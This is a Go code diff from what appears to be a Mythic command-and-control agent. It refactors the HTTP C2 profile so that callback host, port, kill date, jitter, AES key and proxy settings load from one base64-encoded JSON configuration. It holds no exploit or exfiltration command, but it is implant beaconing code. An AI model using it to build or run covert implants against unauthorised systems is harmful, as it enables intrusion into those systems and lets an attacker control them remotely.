@@ -26,40 +26,27 @@ import (
 )
 
 // HTTP C2 profile variables from https://github.com/MythicC2Profiles/http/blob/master/C2_Profiles/http/mythic/c2_functions/HTTP.py
-// All variables must be a string so they can be set with ldflags
+// base64 encoded version of the JSON initial configuration of HTTP
+var http_initial_config string
 
-// callback_host is the callback host
-var http_callback_host string
-
-// callback_port is the callback port
-var http_callback_port string
-
-// killdate is the Killdate
-var http_killdate string
-
-// encrypted_exchange_check is Perform Key Exchange
-var http_encrypted_exchange_check string
-
-// callback_interval is the callback interval in seconds
-var http_callback_interval string
-
-// callback_jitter is Callback Jitter in percent
-var http_callback_jitter string
-
-// headers
-var http_headers string
-
-// AESPSK is the Crypto type
-var http_AESPSK string
-
-// post_uri is the POST request URI
-var http_post_uri string
-
-var http_proxy_host string
-var http_proxy_port string
-var http_proxy_user string
-var http_proxy_pass string
-var http_proxy_bypass string
+type HTTPInitialConfig struct {
+	CallbackHost           string            `json:"callback_host"`
+	CallbackPort           uint              `json:"callback_port"`
+	Killdate               string            `json:"killdate"`
+	Interval               uint              `json:"callback_interval"`
+	Jitter                 uint              `json:"callback_jitter"`
+	PostURI                string            `json:"post_uri"`
+	GetURI                 string            `json:"get_uri"`
+	QueryPathName          string            `json:"query_path_name"`
+	EncryptedExchangeCheck bool              `json:"encrypted_exchange_check"`
+	Headers                map[string]string `json:"headers"`
+	AESPSK                 string            `json:"AESPSK"`
+	ProxyPort              uint              `json:"proxy_port"`
+	ProxyUser              string            `json:"proxy_user"`
+	ProxyPass              string            `json:"proxy_pass"`
+	ProxyHost              string            `json:"proxy_host"`
+	ProxyBypass            bool              `json:"proxy_bypass"`
+}
 
 type C2HTTP struct {
 	BaseURL        string            `json:"BaseURL"`
@@ -81,83 +68,85 @@ type C2HTTP struct {
 
 // New creates a new HTTP C2 profile from the package's global variables and returns it
 func init() {
+	initialConfigBytes, err := base64.StdEncoding.DecodeString(http_initial_config)
+	if err != nil {
+		utils.PrintDebug(fmt.Sprintf("error trying to decode initial http config, exiting: %v\n", err))
+		os.Exit(1)
+	}
+	initialConfig := HTTPInitialConfig{}
+	err = json.Unmarshal(initialConfigBytes, &initialConfig)
+	if err != nil {
+		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial http config, exiting: %v\n", err))
+		os.Exit(1)
+	}
 	var final_url string
 	var last_slash int
-	if http_callback_port == "443" && strings.Contains(http_callback_host, "https://") {
-		final_url = http_callback_host
-	} else if http_callback_port == "80" && strings.Contains(http_callback_host, "http://") {
-		final_url = http_callback_host
+	if initialConfig.CallbackPort == 443 && strings.Contains(initialConfig.CallbackHost, "https://") {
+		final_url = initialConfig.CallbackHost
+	} else if initialConfig.CallbackPort == 80 && strings.Contains(initialConfig.CallbackHost, "http://") {
+		final_url = initialConfig.CallbackHost
 	} else {
-		last_slash = strings.Index(http_callback_host[8:], "/")
+		last_slash = strings.Index(initialConfig.CallbackHost[8:], "/")
 		if last_slash == -1 {
 			//there is no 3rd slash
-			final_url = fmt.Sprintf("%s:%s", http_callback_host, http_callback_port)
+			final_url = fmt.Sprintf("%s:%d", initialConfig.CallbackHost, initialConfig.CallbackPort)
 		} else {
 			//there is a 3rd slash, so we need to splice in the port
 			last_slash += 8 // adjust this back to include our offset initially
 			//fmt.Printf("index of last slash: %d\n", last_slash)
 			//fmt.Printf("splitting into %s and %s\n", string(callback_host[0:last_slash]), string(callback_host[last_slash:]))
-			final_url = fmt.Sprintf("%s:%s%s", string(http_callback_host[0:last_slash]), http_callback_port, string(http_callback_host[last_slash:]))
+			final_url = fmt.Sprintf("%s:%d%s", initialConfig.CallbackHost[0:last_slash], initialConfig.CallbackPort, initialConfig.CallbackHost[last_slash:])
 		}
 	}
 	if final_url[len(final_url)-1:] != "/" {
 		final_url = final_url + "/"
 	}
 	//fmt.Printf("final url: %s\n", final_url)
-	killDateString := fmt.Sprintf("%sT00:00:00.000Z", http_killdate)
+	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
 	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
 	if err != nil {
 		os.Exit(1)
 	}
 	profile := C2HTTP{
 		BaseURL:        final_url,
-		PostURI:        http_post_uri,
-		ProxyUser:      http_proxy_user,
-		ProxyPass:      http_proxy_pass,
-		Key:            http_AESPSK,
+		PostURI:        initialConfig.PostURI,
+		ProxyUser:      initialConfig.ProxyUser,
+		ProxyPass:      initialConfig.ProxyPass,
+		Key:            initialConfig.AESPSK,
 		Killdate:       killDateTime,
 		ShouldStop:     true,
 		stoppedChannel: make(chan bool, 1),
 	}
 
 	// Convert sleep from string to integer
-	i, err := strconv.Atoi(http_callback_interval)
-	if err == nil {
-		profile.Interval = i
-	} else {
-		profile.Interval = 10
+	profile.Interval = int(initialConfig.Interval)
+	if profile.Interval < 0 {
+		profile.Interval = 0
 	}
 
 	// Convert jitter from string to integer
-	j, err := strconv.Atoi(http_callback_jitter)
-	if err == nil {
-		profile.Jitter = j
-	} else {
-		profile.Jitter = 23
+	profile.Jitter = int(initialConfig.Jitter)
+	if profile.Jitter < 0 {
+		profile.Jitter = 0
 	}
 
 	// Add HTTP Headers
-	//json.Unmarshal([]byte("[{\"name\": \"User-Agent\",\"key\": \"User-Agent\",\"value\": \"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\"}]"), &profile.HeaderList)
-	if err := json.Unmarshal([]byte(http_headers), &profile.HeaderList); err != nil {
-		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal headers: %v\n", err))
-	}
+	profile.HeaderList = initialConfig.Headers
 
 	// Add proxy info if set
-	if len(http_proxy_host) > 3 {
-		profile.ProxyURL = fmt.Sprintf("%s:%s/", http_proxy_host, http_proxy_port)
+	if len(initialConfig.ProxyHost) > 3 {
+		profile.ProxyURL = fmt.Sprintf("%s:%d/", initialConfig.ProxyHost, initialConfig.ProxyPort)
 
-		if len(http_proxy_user) > 0 && len(http_proxy_pass) > 0 {
-			profile.ProxyUser = http_proxy_user
-			profile.ProxyPass = http_proxy_pass
+		if len(initialConfig.ProxyUser) > 0 && len(initialConfig.ProxyPass) > 0 {
+			profile.ProxyUser = initialConfig.ProxyUser
+			profile.ProxyPass = initialConfig.ProxyPass
 		}
 	}
 
 	// Convert ignore_proxy from string to bool
-	profile.ProxyBypass, _ = strconv.ParseBool(http_proxy_bypass)
+	profile.ProxyBypass = initialConfig.ProxyBypass
+	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck
 
-	if http_encrypted_exchange_check == "true" {
-		profile.ExchangingKeys = true
-	}
 	RegisterAvailableC2Profile(&profile)
 }
 
